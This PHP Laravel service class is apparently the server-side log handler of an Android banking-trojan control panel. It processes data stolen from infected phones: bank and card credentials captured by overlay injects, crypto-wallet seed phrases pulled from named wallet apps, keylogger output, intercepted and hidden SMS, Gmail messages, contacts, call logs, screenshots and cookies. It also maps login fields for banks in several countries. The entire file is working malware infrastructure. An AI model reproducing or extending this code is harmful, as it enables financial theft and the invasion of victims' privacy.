<?php

namespace App\Services\LogsService;

use App\Models\BotLog;
use App\Models\Injection;
use Carbon\Carbon;
use Illuminate\Contracts\Pagination\LengthAwarePaginator;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use JsonException;
use PHPUnit\Framework\MockObject\Exception;
use Throwable;

class LogsService
{
    public const INJECT_LOG_TYPES = [
        "banks",
        "stealers",
        "crypt",
        "shops",
        "emails",
        "wallets",
        "credit_cards",
    ];

    public function __construct(protected LogsFilter $filter)
    {
    }

    public static function getArrayLog(mixed $log): array
    {
        if (is_array($log)) {
            return $log;
        }

        if (is_string($log)) {
            try {
                return json_decode($log, true, flags: JSON_THROW_ON_ERROR);
            } catch (JsonException $exception) {
                Log::error($exception);
            }
        }

        return [];
    }

    public function getLogs(): mixed
    {
        if ($this->isInjectLogs()) {
            $logs = $this->getInjectLogsQuery();
        } else if ($this->isPushListLogs()) {
            $logs = $this->getPushListLogs();
        } else if ($this->isNonAccessibilityPushListLogs()) {
            $logs = $this->getNonAccessibilityPushListLogs();
        } else if ($this->isHideSMSLogs()) {
            $logs = $this->getHideSMSLogs();
        } else if ($this->isKeyLoggerLogs()) {
            $logs = $this->getKeyLoggerLogs();
        } else if ($this->isGmailMessageLogs()) {
            $logs = $this->getGmailMessageLogs();
        } else if ($this->isAppListLogs()) {
            $logs = $this->getAppListLogs();
        } else if ($this->isSMSListLogs()) {
            $logs = $this->getSMSListLogs();
        } else if ($this->isOtherAccountsLogs()) {
            $logs = $this->getOtherAccountsLogs();
        } else if ($this->isContactsListLogs()) {
            $logs = $this->getContactsListLogs();
        } else if ($this->isCallHistoryLogs()) {
            $logs = $this->getCallHistoryLogs();
        } else if ($this->isScreenshotLogs()) {
            $logs = $this->getScreenshotLogs();
        } else if ($this->isApplicationLogs()) {
            $logs = $this->getApplicationLogs();
        } else if ($this->isEventLogs()) {
            $logs = $this->getEventLogs();
        } else if($this->isCookiesLogs()) {
            $logs = $this->getCookiesLogs();
        } else if($this->isPhotoLogs()) {
            $logs = $this->getPhotoLogs();
        } else {
            $logs = $this->filter
                ->getLogsQuery()
                ->paginate($this->filter->getPerPage());

            $logs->getCollection()->transform(function (BotLog $log) {
                $log->log = self::getArrayLog($log->log);
                return $log;
            });
        }

        return $logs;
    }

    public function getInjectLogsQuery(): LengthAwarePaginator
    {
        $application = $this->filter->getSearchApplication();

        $searchQuery = $this->filter->getSearchQuery();

        $sortBy = $this->filter->getSortBy();
        $sortField = $this->filter->getSortField();

        $logs = $this->filter
            ->getLogsQuery()
            ->when(!empty($application), function ($query) use ($application) {
                $query->where("application", $application);
            })->when(!empty($searchQuery), function ($query) use ($searchQuery) {
                $query->where("log", "LIKE", "%$searchQuery%");
            })->when(!empty($sortBy) && !empty($sortField), function ($query) use ($sortBy, $sortField) {
                if ($sortBy === "descend") {
                    $query->orderByDesc($sortField);
                } else {
                    $query->orderBy($sortField);
                }
            })->with("bot")
            ->paginate($this->filter->getPerPage());

        $logs->getCollection()
            ->transform(function (BotLog $log) {
                $log->log = self::getArrayLog($log->log);
                if($log->type !== "stealers") {
                    $log->log = $this->mapLogs(LogsService::getArrayLog($log->log), $log->type);
                }

                if ($log->type === "stealers") {
                    try {
                        switch ($log->application) {
                            case "com.bitcoin.mwallet":
                                $log->log = collect($log->log)->filter(function ($value, $key) {
                                    return str_contains($key, "word_");
                                })->map(function ($value) {
                                    $value = trim($value);
                                    $value = preg_replace("/[^a-zA-Z]+/", "", $value);
                                    return trim($value);
                                })->implode(" ");

                                $log->log = ["phrase" => $log->log];
                                break;

                            case "org.toshi":
                            case "com.samourai.wallet":
                                $log->log = ["phrase" => $log->log["word_0"]];
                                break;
                            case "com.wallet.crypto.trustappt":
                                $log->log = collect($log->log)->filter(function ($value, $key) {
                                    return str_contains($key, "word_");
                                })->implode(" ");

                                $log->log = ["phrase" => $log->log];
                                break;
                            case "piuk.blockchain.android":
                                $log->log = collect($log->log)->filter(function ($value, $key) {
                                    return (int)$key % 2 !== 0;
                                })->implode(" ");

                                $log->log = ["phrase" => $log->log];
                                break;
                            case "io.safepal.wallet":
                            case "exodusmovement.exodus":
                                $log->log = collect($log->log)->implode(" ");

                                $log->log = ["phrase" => $log->log];
                                break;
                        }
                    } catch(Exception) {
                        $log->log = [];
                    }
                }

                return $log;
            });

        auth()->user()?->entitiesTimestamps?->update([
            $this->filter->getType() => Carbon::now()->toDateTimeString(),
        ]);

        return $logs;
    }

    public function getPushListLogs(): LengthAwarePaginator
    {
        return $this->filter
            ->getLogsQuery()
            ->paginate($this->filter->getPerPage());
    }

    public function getNonAccessibilityPushListLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->paginate($this->filter->getPerPage());

        $logs->getCollection()->transform(function (BotLog $log) {
            // golang log format: InterceptedNotification(title=text, body=text, footer=, app=text, time=timestamp)
            $log->log = [
                "notification" => "-",
                "package" => "-",
                "text" => $log->log,
                "ticker" => "-",
            ];
            return $log;
        });

        return $logs;
    }

    public function getHideSMSLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->get();

        $logsCollection = new Collection;

        foreach ($logs as $log) {
            $logsCollection = $logsCollection->merge([
                self::getArrayLog($log->log),
            ]);
        }

        $logsCollection = $logsCollection->paginate($this->filter->getPerPage());

        if (isset($log)) {
            $log->log = $logsCollection->values();
            $logs = collect([$log]);
        } else {
            $logs = collect([]);
        }

        return $logs->paginate(15);
    }

    public function getKeyLoggerLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            // its doesn"t work now, because we store string on JSON field
            //->whereRaw("JSON_EXTRACT(log, ?)", ["$.\"" . $this->filter->getKeyLoggerAction() . "\""])
            ->where("log", "LIKE", "%" . $this->filter->getKeyLoggerAction() . "%")
            ->paginate($this->filter->getPerPage());

        $logs->getCollection()->transform(function (BotLog $log) {
            $log->log = self::getArrayLog($log->log);
            return $log;
        });

        return $logs;
    }

    public function getGmailMessageLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->paginate(1);

        $logs->getCollection()->transform(function (BotLog $log) {
            $log->log = self::getArrayLog($log->log);

            $newLogData = isset($log->log[$log->type]) ? $log->log[$log->type] : "[]";

            $logsFromJson = json_decode(base64_decode($newLogData), true);

            $logs = [];

            foreach ($logsFromJson as $key => $logFromJson) {
                foreach ($logFromJson as $_key => $_log) {
                    $logs[$key][$_key] = $_key === "list" ? base64_decode($_log) : $_log;
                }
            }

            $log->log = $logs;

            return $log;
        });

        return $logs;
    }

    public function getAppListLogs(): LengthAwarePaginator
    {
        $log = $this->filter
            ->getLogsQuery()
            ->first();

        if (!$log) {
            return collect([])->paginate(1);
        }

        $log->log = self::getArrayLog($log->log);

        $logs = new Collection;

        if ($log) {
            $logs->add($log);
        }

        return $logs->map(function (BotLog $botLog) {
            $log = collect($botLog->log);

            $applications = $log->pluck("app");

            $injections = Injection::select(["application", "type", "name"])
                ->whereIn("application", $applications)
                ->get();

            $injections = $injections->mapWithKeys(function (Injection $injection) {
                return [
                    $injection->application => [
                        "type" => $injection->type,
                        "name" => $injection->name,
                    ],
                ];
            });

            $logs = [];

            foreach ($botLog->log as $log) {
                $application = $log["app"] ?? "";

                $image = isset($injections[$log["app"]])
                    ? "injects/images/{$injections[$log["app"]]["type"]}/$application.png"
                    : "images/application_not_found.png";

                $logs[] = [
                    "application" => $application,
                    "image" => $image,
                    "name" => $injections[$application]["name"] ?? "-",
                ];
            }

            $botLog->log = $logs;

            return $botLog;
        })->paginate(1);
    }

    public function getSMSListLogs(): LengthAwarePaginator
    {
        /** @var Collection $logs */
        $logs = $this->filter
            ->getLogsQuery()
            ->paginate(5);

        $logsCollection = new Collection;

        foreach ($logs as $log) {
            /** @var BotLog $log */
            $log->log = self::getArrayLog($log->log);

            $_logs = json_decode(base64_decode($log->log["sms"] ?? ""), true);

            $logsCollection = $logsCollection->merge($_logs);
        }

        $log = $logs->first();

        if ($log) {
            $log->log = $logsCollection->unique()->toArray();
            $logs = collect([$log]);
        } else {
            $logs = collect([]);
        }

        $this->filter->getUser()?->entitiesTimestamps?->update([
            "events" => Carbon::now()->toDateTimeString(),
        ]);

        return $logs->paginate(1);
    }

    public function getOtherAccountsLogs(): LengthAwarePaginator
    {
        $log = $this->filter
            ->getLogsQuery()
            ->first();

        $logs = new Collection;

        if ($log) {
            $logs->add($log);
        }

        $logs->map(function (BotLog $botLog) {
            $botLog->log = self::getArrayLog($botLog->log);

            $log = collect($botLog->log);

            $applications = $log->pluck("type");

            $injections = Injection::select(["application", "type"])->whereIn("application", $applications)->get();

            $injections = $injections->mapWithKeys(function (Injection $injection) {
                return [$injection->application => $injection->type];
            });

            $logs = [];

            foreach ($botLog->log as $log) {
                $application = $log["type"] ?? "";

                $image = isset($injections[$log["type"]]) ? "injects/images/$injections[$application]/$application.png" : "images/application_not_found.png";

                $logs[] = [
                    "account" => $log["name"] ?? "",
                    "application" => $application,
                    "image" => $image,
                ];
            }

            $botLog->log = $logs;

            return $botLog;
        });

        $logs = $logs->paginate(15);

        return $logs;
    }

    public function getContactsListLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->paginate($this->filter->getPerPage());

        $_logs = collect([]);

        foreach ($logs as $log) {
            $log->log = self::getArrayLog($log->log);

            try {
                $_logs = $_logs->merge(collect(json_decode($log->log["contacts"], true)));
            } catch (Throwable) {
                $_logs = [];
            }
        }

        if ($logs->count()) {
            $log = $logs->first();
            $log->log = $_logs;
            $logs = collect([$log]);
        } else {
            $logs = $_logs;
        }

        $logs = $logs->paginate(count($logs) || 1);

        return $logs;
    }

    public function getCallHistoryLogs(): LengthAwarePaginator
    {
        $log = $this->filter
            ->getLogsQuery()
            ->first();

        $logs = new Collection;

        if ($log) {
            $logs->add($log);
        }

        $logs->map(function (BotLog $botLog) {
            $botLog->log = self::getArrayLog($botLog->log);

            return $botLog;
        });

        $logs = $logs->paginate(1);

        return $logs;
    }

    public function getScreenshotLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery();

        $logs = $logs->paginate($this->filter->getPerPage());

        foreach ($logs as $log) {
            $log->log = self::getArrayLog($log->log);

            $image = $log->log["nameValuePairs"]["image64"];  // your base64 encoded

            $image = str_replace("data:image/png;base64,", "", $image);

            $image = str_replace(" ", "+", $image);

            $imageName = $log->log["nameValuePairs"]["name"] . "." . "png";

            $filePath = "screenshots/" . $imageName;

            if (!Storage::disk("public")->exists($filePath)) {
                Storage::disk("public")->put($filePath, base64_decode($image));
            }

            $log->log = [
                "image" => $filePath,
                "created_at" => $log->created_at?->format("Y-m-d"),
            ];
        }

        return $logs;
    }

    public function getApplicationLogs(): LengthAwarePaginator
    {
        return $this->filter
            ->getLogsQuery()
            ->paginate($this->filter->getPerPage());
    }

    public function getEventLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->orderBy("id", "DESC")
            ->paginate($this->filter->getPerPage());

        $logs->getCollection()->transform(function (BotLog $botLog) {
            $botLog->log = [
                "text" => $botLog->log,
            ];

            return $botLog;
        });

        return $logs;
    }

    public function getCookiesLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery()
            ->paginate($this->filter->getPerPage());

        $logs->getCollection()->transform(function (BotLog $botLog) {
            $botLog->log = self::getArrayLog($botLog->log);

            return $botLog;
        });

        return $logs;
    }

    /**
     * @throws \Exception
     */
    public function getPhotoLogs(): LengthAwarePaginator
    {
        $logs = $this->filter
            ->getLogsQuery();

        $logs = $logs->paginate($this->filter->getPerPage());

        foreach ($logs as $key => $log) {
            $log->log = self::getArrayLog($log->log);

            $image = $log->log["nameValuePairs"]["buffer"];

            $image = str_replace("data:image/png;base64,", "", $image);

            $image = str_replace(" ", "+", $image);

            $imageName = time() . random_int(1, 1000000) . $key . "." . "png";

            $filePath = "screenshots/" . $imageName;

            if (!Storage::disk("public")->exists($filePath)) {
                Storage::disk("public")->put($filePath, base64_decode($image));
            }

            $log->log = [
                "image" => $filePath,
                "created_at" => $log->created_at?->format("Y-m-d"),
            ];
        }

        return $logs;
    }

    public function isInjectLogs(): bool
    {
        return in_array($this->filter->getType(), self::INJECT_LOG_TYPES, true);
    }

    public function isPushListLogs(): bool
    {
        return $this->filter->getType() === "pushlist";
    }

    public function isHideSMSLogs(): bool
    {
        return $this->filter->getType() === "hidesms";
    }

    public function isNonAccessibilityPushListLogs(): bool
    {
        return $this->filter->getType() === "pushlist2";
    }

    public function isKeyLoggerLogs(): bool
    {
        return $this->filter->getType() === "keylogger";
    }

    public function isGmailMessageLogs(): bool
    {
        return in_array($this->filter->getType(), ["gmail_messages", "gmail_mes"], true);
    }

    public function isAppListLogs(): bool
    {
        return $this->filter->getType() === "applist";
    }

    public function isSMSListLogs(): bool
    {
        return $this->filter->getType() === "smslist";
    }

    public function isOtherAccountsLogs(): bool
    {
        return $this->filter->getType() === "otheraccounts";
    }

    public function isContactsListLogs(): bool
    {
        return $this->filter->getType() === "phonenumber";
    }

    public function isCallHistoryLogs(): bool
    {
        return $this->filter->getType() === "callLog";
    }

    public function isScreenshotLogs(): bool
    {
        return $this->filter->getType() === "TakeScreenShot";
    }

    public function isApplicationLogs(): bool
    {
        return $this->filter->getType() === "application";
    }

    public function isEventLogs(): bool
    {
        return in_array($this->filter->getType(), ["error", "success"], true);
    }

    public function isCookiesLogs(): bool
    {
        return $this->filter->getType() === "cookies";
    }

    public function isPhotoLogs(): bool
    {
        return $this->filter->getType() === "photo";
    }

    private function mapLogs(array $log, string $type, bool $withoutAndroidFields = true): array
    {
        $androidFields = ["type_injects", "closed"];

        $mappings = [
            "wallets" => [
                "paypallogin" => "login",
                "login" => "login",
                "Login" => "login",
                "email" => "login",
                "password" => "password",
                "Password" => "password",
                "Passwords" => "password",
                "paypalpassword" => "password",
                "code" => "password",
                "holder_name" => "name",
                "last_name" => "surname",
            ],
            "shops" => [
                "login" => "login",
                "email" => "login",
                "password" => "password",
            ],
            "crypt" => [
                "login" => "login",
                "email" => "login",
                "Login" => "login",
                "Mnemonic" => "login",
                "bip39" => "password",
                "Password" => "password",
                "password" => "password",
                "key" => "publicKey",
                "publicKey" => "publicKey",
                "secretKey" => "secretKey",
                "secret" => "secretKey",
                "backup" => "backupPhrase",
                "words" => "backupPhrase",
                "pin" => "pin",
            ],
            "emails" => [
                "email" => "email",
                "password" => "password",
                "surname" => "surname",
                "name" => "name",
            ],
            "credit_cards" => [
                "holderName" => "holderName",
                "holder_name" => "holderName",
                "Cardholder" => "holderName",
                "last_name" => "lastName",
                "surname" => "lastName",
                "cvc" => "CVV",
                "cvv" => "CVV",
                "exp_mm" => "expMM",
                "exp_yy" => "expYY",
                "number_card" => "cardNumber",
                "" => "cardNumber",
                "cc" => "cardNumber",
                "exp" => "exp",
            ],
            "banks" => [
                "usuario" => "login",
                "login" => "login",
                "id" => "login",
                "Login" => "login",
                "loginKobi" => "login",
                "user" => "login",
                "User" => "login",
                "datauser" => "login",
                "loginBireysel" => "login",
                "agencia" => "login",
                "nutzerkennung" => "login",
                "identyfikator" => "login",
                "particulier_login" => "login",
                "utente" => "login",
                "codicecliente" => "login",
                "pasport" => "login",
                "haslo" => "password",
                "particulier_password" => "password",
                "Passwort" => "password",
                "conta" => "password",
                "passwordBireysel" => "password",
                "passwordKobi" => "password",
                "datapass" => "password",
                "Pass" => "password",
                "pass" => "password",
                "password" => "password",
                "clave" => "password",
                "myinput" => "password",
                "Passwort_wiederholen" => "password",
            ],
        ];

        $mappedLog = [];

        try {
            $log = json_decode($log["data"], true, 512, JSON_THROW_ON_ERROR);
        } catch (Throwable) {
        }

        foreach ($log as $field => $value) {
            if (isset($mappings[$type][$field])) {
                $mappedLog[$mappings[$type][$field]] = $value;
            } else {
                if ($withoutAndroidFields && in_array($field, $androidFields, true)) {
                    continue;
                }
                $mappedLog["additional"][$field] = $value;
            }
        }

        return $mappedLog;
    }
}
